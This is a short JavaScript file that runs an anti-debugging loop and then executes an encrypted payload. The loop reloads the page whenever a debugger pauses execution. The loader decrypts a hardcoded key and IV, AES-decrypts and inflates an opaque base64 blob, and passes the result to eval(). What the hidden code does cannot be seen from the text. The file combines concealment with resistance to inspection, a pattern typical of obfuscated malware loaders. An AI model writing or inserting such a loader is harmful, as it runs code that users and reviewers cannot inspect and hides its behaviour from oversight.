CryptoJS = require('crypto-js');
pako = require('pako');
(function(){
    
(function(){
    function detectDebugger() {
        const start = Date.now();
        debugger;
        if (Date.now() - start > 100) {
            window.location.reload();
        }
    }
    setInterval(detectDebugger, 1000);
})();

    const encryptedData = "4fIum1TTErTjWiryX7ac+iDuqzD+u0ozlbHrpaYTcmAY5XjEt9T+wF0xCU2gwzCYbd92bQ8pM5VKIZxJftmlp/Ea9It1Owuw5wbLa2XCuRfStRUpbr6RTGfi+iTLY7nBnVp/vX+rhNFbvPTpBgvhOVzLB3VjdagnVsT3lVXPnV0Bs2QCUKF+v8c7mTmvv8OX7GasAr6pHwHipqFLeUcfMd0h2ov6bZyDiTtW/u+2dHAXBHZYwh474tKI5RtY1iIPVdfKJWPgV0KyzLdtLjaz+807Ls1/u9O/2VujeXxnC3h7TQ9ne4NUv+GmGc1qTwO94oGEpJshLl/rTQtcmzsvGIDCNXAO4KtK6U63V1J+QbTqGuaEizhKWPGZMuWUK5D9TowgYz4c7rrNRDhc6i8WCX8TINhVTlGOKEupp4HiotuTk0Xrgsg/II+zF+AAWDLe67bgoXo4gRFAK48UaBNLGP3BPalopdHQqeyUECyneA4mGm1LuE6xAdqYTpXBT8Ym";
    const encryptedKey = "U2FsdGVkX19cyUKmfwzYn/ZFSg4TXWtsdQB+OEhh/wf7LMep7HSFsXEaOrs/IKFVEHFjWvHyX+vcZMGlHWOy/w==";
    const encryptedIV = "U2FsdGVkX18ZW0MiPGZeyqkJjq2buKMu4lN7sNY4cl9ZKJpNJ30v6n/HJfJw21FsphhjoEaSUs6jBqNifojaUw==";

    function decryptKeyAndIV() {
        const decryptedKey = CryptoJS.AES.decrypt(encryptedKey, 'randomSaltForKey').toString(CryptoJS.enc.Utf8);
        const decryptedIV = CryptoJS.AES.decrypt(encryptedIV, 'randomSaltForIV').toString(CryptoJS.enc.Utf8);
        return { key: CryptoJS.enc.Hex.parse(decryptedKey), iv: CryptoJS.enc.Hex.parse(decryptedIV) };
    }

    function decryptAndRun() {
        try {
            const { key, iv } = decryptKeyAndIV();

            const decrypted = CryptoJS.AES.decrypt(
                { ciphertext: CryptoJS.enc.Base64.parse(encryptedData) },
                key,
                { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }
            );

            const compressedData = decrypted.toString(CryptoJS.enc.Latin1);
            const binaryString = Array.from(compressedData, c => c.charCodeAt(0));
            const decompressed = pako.inflate(new Uint8Array(binaryString), { to: 'string' });

            eval(decompressed);
        } catch (e) {
            console.error("Decryption or execution failed:", e);
        }
    }

    decryptAndRun();
})();